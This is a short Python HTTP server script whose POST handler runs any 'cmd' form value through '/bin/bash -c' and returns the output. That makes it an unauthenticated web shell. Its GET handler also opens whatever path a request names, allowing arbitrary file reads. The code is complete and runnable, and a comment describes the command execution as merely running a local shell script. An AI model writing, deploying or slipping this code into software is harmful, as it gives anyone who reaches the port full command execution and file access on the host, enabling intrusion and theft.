import http.server
import cgi
import subprocess

PORT = 8000

class Handler(http.server.CGIHTTPRequestHandler):
    def do_GET(self):
        # Serve a GET request
        if self.path == '/':
            self.path = '/index.html'
        try:
            # Check if the file is present in the web root directory
            file_to_open = open(self.path[1:]).read()
            self.send_response(200)
        except:
            # If file is not present send a 404 error
            file_to_open = "File not found"
            self.send_response(404)
        self.end_headers()
        self.wfile.write(bytes(file_to_open, 'utf-8'))
        
    def do_POST(self):
        # Serve a POST request
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        self.send_response(200)
        self.end_headers()
        output = ""
        for item in form.list:
            output += item.name + "=" + item.value + "\r\n"
        
        # Run a shell script in the same directory as the web server
        cmd = form.getvalue("cmd")
        if cmd:
            output = subprocess.check_output(["/bin/bash", "-c", cmd], universal_newlines=True)
        
        # Write the output of the form data and the shell script back to the browser
        self.wfile.write(output.encode())

httpd = http.server.HTTPServer(("", PORT), Handler)
print("Serving at port", PORT)
httpd.serve_forever()


